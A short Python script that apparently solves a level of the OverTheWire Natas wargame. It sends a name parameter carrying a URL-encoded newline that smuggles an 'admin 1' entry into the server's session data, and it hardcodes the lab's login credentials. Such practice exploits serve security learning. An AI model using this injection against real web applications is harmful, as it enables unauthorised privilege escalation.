import requests

DASH = "2d"
URL = "http://natas20.natas.labs.overthewire.org/index.php?name=admin2%0Aadmin%201"
CREDS = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
PHPSESSID = "PHPSESSID"

s = requests.Session()
s.auth = CREDS

cookie = {PHPSESSID: 0}

print(s.get(URL).text)
print(s.get(URL).text)
